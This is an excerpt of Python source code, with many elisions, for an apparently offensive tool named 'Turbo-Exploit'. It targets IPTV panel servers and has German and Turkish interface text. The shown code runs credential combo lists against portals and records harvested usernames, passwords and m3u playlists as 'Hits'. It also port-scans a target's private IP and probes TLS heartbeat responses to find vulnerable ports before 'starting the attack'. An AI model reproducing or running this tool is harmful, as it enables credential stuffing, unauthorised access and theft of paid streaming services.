...
class Display:
    ...
    def ak_set_title(self):
        ...
        for _v in v:
            if re.search(_v, str(Glb.my_environ)) is not None:
                ...
                os.system('mode 98, 47')  # minimum size cols=62 rows=40 (rows=47 for good Acc)
    ...
    def ak_heads(self):
        print('Choold-Version P.1.Plus')
        print('{}{}\33[96mTurbo-Exploit {}{}'.format(Glb.RED_L, Glb.BOLD, Glb.WHITE_L, Glb.RESET))
        
    def ak_settings(self):
        print(f'{Glb.GREEN_L} \33[0m╔══════════ {Glb.WHITE_L} Genel Ayarlar Yüklendi ═════════════════════ {Glb.GREEN_L}')
        print(f'{Glb.GREEN_L} \33[0m║{Glb.RESET}')
        print(f'{Glb.GREEN_L} \33[0m║ \33[96m[+] \33[0mTarama Tipi : {Glb.WHITE_L} {Glb.scan_mode}')
        print(f'{Glb.GREEN_L} \33[0m║ \33[96m[+] \33[0mCombo Yüklendimi : {Glb.WHITE_L} {Glb.combo_length} {Glb.BLUE_L} {Glb.combo_file_name}')
        print(f'{Glb.GREEN_L} \33[0m║ \33[96m[+] \33[0mTaranan Server : {Glb.WHITE_L} {Glb.servers_length} {Glb.BLUE_L} {Glb.servers_file_name if len(Glb.servers_file_name) < 20 else Glb.servers_file_name[:20] + "..."}')
        print(f'{Glb.GREEN_L} \33[0m║ \33[96m[+] \33[0mTarama Yardimcisi : {Glb.WHITE_L} {Glb.userAgent if len(Glb.userAgent) < 23 else Glb.userAgent[:23] + "..."}')
        ...
        print(f'{Glb.GREEN_L} \33[0m║ \33[96m[+] \33[0mKaç istekle  : {Glb.WHITE_L} {Glb.threadMain}')
    ...
    def ak_statistic(self):
        print(f'\n{Glb.WHITE_L}  ╔═════════ {Glb.WHITE_L} Choold ═══ Exploit ════Sonuclari══════════ {Glb.WHITE_L}')
        print(f'{Glb.WHITE_L}  \33[0m║{Glb.WHITE_L}')
        print(f'{Glb.WHITE_L}  \33[0m║ \33[96m [+] \33[0mDüşen Hits : {Glb.GREEN_L} {Glb.Hits}')
        print(f'{Glb.WHITE_L}  \33[0m║ \33[96m [+] \33[0mHatali Yada Vpn : {Glb.RED_L} {Glb.Bads}')
        print(f'{Glb.WHITE_L}  \33[0m║ \33[96m [+] \33[0mDenenen : {Glb.YELLOW} {Glb.Errors}')
        print(f'{Glb.WHITE_L}  \33[0m║ \33[96m [+] \33[0milerleme Yüz : {Glb.WHITE_L} {Glb.totalChecked}/{Glb.totalToCheck} {Glb.WHITE_L} ({Glb.GREEN_L} {Glb.progress} % {Glb.WHITE_L})')
        print(f'{Glb.WHITE_L}  \33[0m║ \33[96m [+] \33[0mCpm : {Glb.BLUE_L} {Glb.cpm}')
        print(f'{Glb.WHITE_L}  \33[0m║ \33[96m [+] \33[0mGecen Zaman : {Glb.BLUE_L} {Glb.elapsed}')
        print(f'{Glb.WHITE_L}  \33[0m║{Glb.WHITE_L}')
    ...
    def cool_msg(self, msg):
        ...
        Clear().clr_line()
        if msg == 'war':
            print('{}   [Scan Vorbereitung] {}'.format(Glb.RESET, Glb.WHITE_L))
        elif msg == 'relax':
            print('')
                                                                                                         
        elif msg == 'done' and Glb.Hits > 0:
            print('{}   Glückwunsch du hast Hits \xf0\x9f\xa4\xaa {} Fertig !! \xf0\x9f\x92\xaa '.format(
                Glb.GREEN_L, Glb.WHITE_L))
        elif msg == '':
            input(self.error_msg(
                '{}>> Du hast das Programm erfolgreich verlassen <<\n\nDrück ENTER zum fortfahren:{}'.format(Glb.GREEN_L,
                                                                                                      Glb.RESET)))
                ...
                try:
                    ...
                    if 'EXTINF' in reqGet:
                        ...
                        urlInfo = self.urlApi.replace('my_server', real_server).replace('my_user', User).replace(
                            'my_pwd', Pass)
                        allInfo.update({'┏➙ Portal': real_server, '┣➙ User': User,
                                        '┣➙ Pass': Pass})
                        try:
                        ...
                        allInfo.update({'┣➙ Scan-Datum': my_date,
                                        '┣➙ Nutzer: P.1 Plus \n'
                                        '   ┗➙ List m3u': url_server,
                                        '┏➙ Module': "User/Pass Hits System",
                                        '┗➙ Categories': ' ↢☣↣ '.join(cate_list), 'FileName': fileName})
                        result = ('Good', allInfo)
                        break
                    else:
                        try:
    ...
    def load_combo(self):
        try:
            ...
            if flag > 0:
                ...
                Glb.running = False
                Display().error_msg(f'{Glb.YELLOW}Stelle sicher das es deine combo gibt {Glb.RESET} und starte nochmal')
                input('Drück weiter')
...
class ThreadPollManager:
    ...
    def thread_pool(self, args, demon=False):
        ...
        if Glb.debug:
            print("Alle Aufgaben wurden erstellt, warten auf Fertigstellung")
        ...
        if self.hitlogger_func is not None:
            self.results_queue.put("Verarbeitung der Ergebnisse stoppen")
        if self.dataAnalizer_func:
            Glb.dataToAnalyze.put("Analyse der Ergebnisse stoppen")
...
class PanelAttackSsl:
    ...
    def recvall(self, s, length, timeout=5):
        ...
        try:
            ...
            if Glb.debug:
                print("recvall--->Fehler beim Lesen der Socket-Daten", err, str(s.getpeername()))
            return None
    ...
    def recvmsg(self, s):
        ...
        if hdr is None:
            if Glb.debug:
                print('HDR Unerwartetes EOF beim Empfangen des Datensatz-Headers - Server hat Verbindung geschlossen', str(s.getpeername()))
            return None, None, None
        typ, ver, ln = struct.unpack('>BHH', hdr)
        pay = self.recvall(s, ln, 10)
        if pay is None:
            if Glb.debug:
                print('payload Unerwartetes EOF beim Empfangen der Datensatzlast - Server hat Verbindung geschlossen',
                      str(s.getpeername()))
            return None, None, None
    ...
    def do_hb_new(self, s, server):
        while True:
            if Glb.debug:
                print(Glb.WHITE_L + "Daten vom Server lesen" + Glb.GREEN + str(s.getpeername()) + Glb.RESET)
            typ, ver, pay = self.recvmsg(s)
            if typ is None:
                if Glb.debug:
                    print("Keine Heartbeat-Antwort erhalten, Server wahrscheinlich nicht anfällig")
                return False
            ...
            if typ == 24:
                ...
                if len(pay) > 3:
                    ...
                    if Glb.debug:
                        print('Server hat fehlerhaftes Heartbeat verarbeitet, hat aber keine zusätzlichen Daten zurückgegeben.')
                return True

            if typ == 21:
                if Glb.debug:
                    print('Empfangene Warnung')

    def checkHB(self, url: str, port: int, sock: socket) -> bool:
        # Method that verifies the vulnerability of the server
        print("Güvenlik açığının kontrol ediliyor:", url, "und Port ", str(port))
        ...
        while _continue:
            ...
            if typ is not None:
                if Glb.debug:
                    print("Empfangene Nachricht: Typ = {}, version = {}".format(typ, hex(ver)))
                ...
                print('Giris istegi Yollandı Giris Kabul Edilmedi.')  # without sending Server Hello.')
                _continue = False
...
class DataAnalyzer:
    ...
    def ext_UserPass(self, data: str) -> tuple:
        try:
            ...
            if Glb.debug:
                print(Glb.RED + "Fehler bei der Verarbeitung der ListM3U Extraktionsdaten:" + str(
                    e) + " Eingabedaten:" + data + Glb.RESET)
            return "", ""
    ...
    def ext_ListM3U(self, data: str) -> tuple:
        try:
            ...
            if Glb.debug:
                print(Glb.RED + "Fehler bei der Verarbeitung von extract_ListM3U:" + str(e) + "\nEingabedaten:" + data + Glb.RESET)
            return "", ""
    ...
    def ext_ReqURI(self, data: str) -> tuple:
        try:
            ...
            if Glb.debug:
                print(Glb.RED + "Fehler bei der Verarbeitung von extract_ReqURI :" + str(e) + "\nEingabedaten:" + data + Glb.RESET)
            return "", ""
    ...
    def ext_ReqTOKEN(self, data: str) -> tuple:
        try:
            ...
            if Glb.debug:
                print(Glb.RED + "Fehler bei der Verarbeitung von extract_ReqTOKEN:" + str(e) + "\nEingabedaten:" + data + Glb.RESET)
            return "", ""
    ...
    def ext_ReqLIVE(self, data: str) -> tuple:
        try:
            ...
            if Glb.debug:
                print(Glb.RED + "Fehler bei der Verarbeitung von extract_ReqLIVE:" + str(
                    e) + "\nEingabedaten:" + data + Glb.RESET)
            return "", ""
    ...
    def ext_ReqEXTINF(self, data: str) -> tuple:
        try:
            ...
            if Glb.debug:
                print(Glb.RED + "Fehler bei der Verarbeitung von extract_ReqEXTINF:" + str(
                    e) + "\nEingabedaten:" + data + Glb.RESET)
            return "", ""
    ...
    def ext_ReqEXTINF2(self, data: str) -> tuple:
        try:
            ...
            if Glb.debug:
                print(Glb.RED + "Fehler bei der Verarbeitung von extract_ReqEXTINF2:" + str(
                    e) + "\nEingabedaten:" + data + Glb.RESET)
            return "", ""
    ...
    def doAnalyze(self):
        while True:
            if not Glb.dataToAnalyze.empty():
                ...
                if data == "Datenverarbeitung stoppen":
                    break
...
class Utilities:
    ...
    def ext_channelFromM3U(self, m3ulink: str) -> list:
        try:
            ...
            print(Glb.RED, "Fehler beim Abrufen der m3u:", str(err), Glb.RESET)
        finally:
    ...
    def ext_ServerFromCh(self, channel_urls: list) -> str:
        ...
        for channel in self.channelLinks:
            try:
                ...
                print(Glb.RED, "Fehler beim Abrufen des privaten IP-Hosts:", str(err), Glb.RESET)
    ...
    def searchOpenPorts_WEB(self, startPort: int, endPort: int, hostToScan: str) -> list:
            ...
            while count < 2:
                try:
                    ...
                    count = count + 1
                    if count < 2:
                        print("Fehler bei der Porterkennung, versuchen Sie es erneut:", e)
                    else:
                        print("Fehler bei der Porterkennung, bitte verwenden Sie die lokale Methode:", e)
                        break
                except Exception as e:
                    print("Fehler bei der Erkennung offener Ports, bitte fügen Sie Ihren Port manuell hinzu")
                    break
            return openPorts
    ...
    def testPort_LOCAL(self, host: str, port: int) -> tuple:
        try:
            with socket(AF_INET, SOCK_STREAM) as sock:
                ...
                if result == 0:
                    if Glb.debug:
                        print(f'Erfolgreiche Verbindung wurde hergestellt: {host}:{port}')
                    return port, True
                else:
                    return port, False
        except Exception as e:
...
class ExploitMain:
        ...
        def startExploitAttack(self, privatehost: str, port: int):
            print("Angriff starten auf :" + privatehost + " port:" + str(port) + "\n")
        ...
        def userPassModule(self):
            ...
            while True:
                ...
                if credential == "Analyse der Ergebnisse stoppen":
                    break
        ...
        def startExploit(self):
            ...
            if Glb.exploit_mode == 'standard':
                Display().loading_effect(True, 'Exploit IP Si Aranıyor.........')
                privateIp = Utilities().getServerIP(Glb.serverList[0])
                Display().loading_effect(False, 'Exploit IP Si Aranıyor.........')
                
                openPorts = PortScanner()
                if Glb.port_scanmode == 'web':
                    if privateIp is not None:
                        Display().loading_effect(True, f'Bağlantı Noktalarını Web Yöntemiyle Taranacak:\n{privateIp} ...')
                        Glb.openPortsList = openPorts.searchOpenPorts_WEB(startPort=0, endPort=30000, hostToScan=privateIp)
                        Display().loading_effect(False, f'Bağlantı Noktalarını Web Yöntemiyle Taranacak:\n{privateIp} ...')
                        print(f'Bu IP Üzerinden Portlar Taranacak  {privateIp} ', Glb.openPortsList)
                        ...
                        if len(Glb.openPortsList) > 0:
                            ...
                            if len(vulPorts) > 0:
                                ...
                                input(
                                    f'{Glb.RED}Bu IP Üzerinden Açık Bulamadım {privateIp}, Lütfen gelişmiş modu kullanın.{Glb.RESET}\n\nAçık Bulamadim Veya Giriş Yasagı Var Enter Yap Çık Sonra Başka M3u Adresi Dene')
                                return StartApp().re_startApp()
                        else:
                            input(
                                f'{Glb.RED}Kein offener Port gefunden für {privateIp}, Bitte verwenden Sie den erweiterten Modus oder den lokalen Portscan.{Glb.RESET}\nBitte drücken Sie ENTER um fortzufahren{Glb.RESET}')
                            return StartApp().re_startApp()
                    else:
                        print(
                            f'{Glb.RED}Private IP konnte nicht gefunden werden für {Glb.serverList[0]}, Bitte stellen Sie sicher, dass Ihr m3u-Link gültig ist oder verwenden Sie den erweiterten Modus.{Glb.RESET}')
                        input('Bitte drücken Sie ENTER um fortzufahren')
                        return StartApp().re_startApp()
                else:  # local port
                    if privateIp is not None:
                        Display().loading_effect(True, f'Ports scannen mit lokaler Methode:\n{privateIp}...')
                        Glb.openPortsList = openPorts.searchOpenPorts_LOCAL(host=privateIp, ports=[25, 110, 119, 143, 22, 465, 563, 587, 993, 995, 8080, 25463, 25462])
                        Display().loading_effect(False, f'Ports scannen mit lokaler Methode:\n{privateIp}...')
                        print(f'Offene Ports gefunden für {privateIp} ', Glb.openPortsList)
                        if len(Glb.openPortsList) > 0:
                            vulPorts = self.findIpVulPort({privateIp: Glb.openPortsList})
                            if len(vulPorts) > 0:
                                Glb.portToAttack = vulPorts[0]
                                ...
                                input(
                                    f'{Glb.RED}Kein anfälliger Port gefunden für {privateIp}, Bitte verwenden Sie den erweiterten Modus.{Glb.RESET}wsdew\n\nBitte drücken Sie ENTER um fortzufahren')
                                return StartApp().re_startApp()
                        else:
                            input(
                                f'{Glb.RED}Kein offener Port gefunden für {privateIp}, Bitte verwenden Sie den erweiterten Modus.{Glb.RESET}\n\nBitte drücken Sie ENTER um fortzufahren')
                            return StartApp().re_startApp()
                    else:
                        input(
                            f'{Glb.RED}Private IP konnte nicht gefunden werden für {Glb.serverList[0]}, Bitte stellen Sie sicher, dass Ihr m3u-Link gültig ist oder verwenden Sie den erweiterten Modus.{Glb.RESET}\n\nBitte drücken Sie ENTER um fortzufahren')
                ...
                if port is None:
                    ...
                    Display().loading_effect(True,
                                             f'Ports scannen mit lokaler Methode:\nDieser Prozess wird einige Zeit in Anspruch nehmen \nweil Sie keinen gültigen Port haben \n {privateIp}...')
                    ...
                    if len(Glb.openPortsList) < 1:
                        input(
                            f'{Glb.RED}Kein offener Port gefunden für {privateIp}.{Glb.RESET}\n\nBitte drücken Sie ENTER um fortzufahren')
                        return StartApp().re_startApp()
                    vulPorts = self.findIpVulPort({privateIp: Glb.openPortsList})
                    if len(vulPorts) > 0:
                        Glb.portToAttack = vulPorts[0]
                        ...
                        input(
                            f'{Glb.RED}Kein offener Port gefunden für {privateIp}, Bitte versuchen Sie es erneut.{Glb.RESET}\n\nBitte drücken Sie ENTER um fortzufahren')
                        return StartApp().re_startApp()
                else:
                    ...
                    if len(vulPorts) > 0:
                        ...
                        input(
                            f'{Glb.RED}Entschuldigung, ich kann keine erfolgreiche Verbindung herstellen mit {Glb.serverList[0]}, Bitte versuchen Sie es erneut.{Glb.RESET}\n\nBitte drücken Sie ENTER um fortzufahren')
                        return StartApp().re_startApp()
...
class InfoCollect:
        ...
        def scan_mode(self):
            ...
            if scanModeInput == '+':
                ...
                print(f'{Glb.RED_L} Dies ist die erste Anweisung, um zurück zu gehen, schreiben Sie + \n um die App zu schließen {Glb.WHITE_L}')
                time.sleep(3)
                ...
                Clear().muve_cursor(7)
                Clear().clr_from_cursor_to_end()
                print('{} Bitte geben Sie den korrekten Scan-Modus ein {}'.format(Glb.RED_L, Glb.WHITE_L))
                return self.scan_mode()
        ...
        def exploit_logic(self):
            exploitOptions = input(
              f' {Glb.RESET}Exploit Option  \n {Glb.CYAN}1 {Glb.RESET}► Seçenek 1: M3u bağlantısıyla Tarama \n  \n{Glb.CYAN} 2{Glb.RESET} ► Seçenek 2: IP/Port ve URL ile Tarama YaYin İp si Gerekli Portu ile\n► {Glb.RESET}')
            if exploitOptions == '1' or exploitOptions == 'standard':
                inputData = input(
                  f' {Glb.RESET}Geçerli m3u satırınızı buraya kopyalayın {Glb.RESET} \n \33[36mM3u \33[0m► {Glb.RESET}')
                m3ulist = re.match(
                ...
                if m3ulist is not None:
                    ...
                    def exploit_port():
                        inputPortScan = input(
                            f' {Glb.CYAN}Wähle den Port-Scan-Modus aus\n{Glb.CYAN} 1 {Glb.RESET} - Web sorgusu...Daha Hızlı Çalışır Ancak Hatalar Meydana Gelebilir....\n{Glb.CYAN} 2 {Glb.RESET} - Yerel Sorgusu...Daha Yavaş Ama Daha Doğru Çalışır.... \n► {Glb.RESET}')
                        if inputPortScan == '1' or inputPortScan in 'web':
                            ...
                            Clear().clr_from_cursor_to_end()
                            print(
                                f'Treffe eine Auswahl {Glb.GREEN}1{Glb.RESET} für (Web) oder {Glb.GREEN}2{Glb.RESET} für (Local)\n>>{Glb.BLUE_L}')
                            return exploit_port()
                    ...
                    Clear().muve_cursor(9)
                    Clear().clr_from_cursor_to_end()
                    print('{} Bitte geben Sie einen gültigen m3u-Link ein oder schreiben Sie exit -{}'.format(Glb.RED_L, Glb.WHITE_L))
                    return self.exploit_logic()

            elif exploitOptions == '2' or exploitOptions == 'Erweitert':
                inputData = input(
                    f' {Glb.RESET}Step 1...Trage hier die IP und port ein\n[{Glb.CYAN} Beispiel ► http://94.130.124.246:25463{Glb.RESET} ] \n► {Glb.RESET}')
                serverPort = re.match(
                ...
                if serverPort is not None:
                    ...
                    inputData = input(f' {Glb.RESET}Step 2...Trage hier die vollständige URL ein\n[{Glb.CYAN} Beispiel ► http://bestitv.xyz:8080{Glb.RESET} ] \n► {Glb.RESET}')
                    ...
                    Clear().muve_cursor(9)
                    Clear().clr_from_cursor_to_end()
                    print('{} Bitte geben Sie ein gültiges url:port Format ein, z.B. https://myserver.net:8080 {}'.format(Glb.RED_L,
                                                                                                            Glb.WHITE_L))
                    return self.exploit_logic()
        ...
        def thread_number(self):
            print(f'{Glb.RESET} Kaç Sunucu iLe Giriş Yapayim En Fazla {os.cpu_count() * 20} {Glb.RESET}')
            threadInput = input(f' {Glb.RESET}Kaç sorgulama yapılmalı?? ipucu (50): \n► {Glb.RESET}')
            if threadInput == '+':
            ...
            try:
                ...
                if Glb.scan_mode == 'exploit':
                    if check <= 2000:
                        ...
                        Clear().clr_from_cursor_to_end()
                        print(
                            '{} Die Anzahl der Threads für den Exploit-Modus-Scan sollte zwischen 1 und 2000 liegen.{}'.format(
                ...
                if 0 < check <= 1000:
                    ...
                    Clear().clr_from_cursor_to_end()
                    print('{} Die Anzahl der Threads sollte zwischen 1 und 200 liegen {}'.format(Glb.RED_L, Glb.WHITE_L))
                    return self.thread_number()

            except Exception as e:
                Clear().muve_cursor(24)
                Clear().clr_from_cursor_to_end()
                print('{} Die Anzahl der Threads sollte eine Zahl kleiner als 200 sein {}'.format(Glb.RED_L, Glb.WHITE_L))
                print(str(e))
                del e
                return self.thread_number()
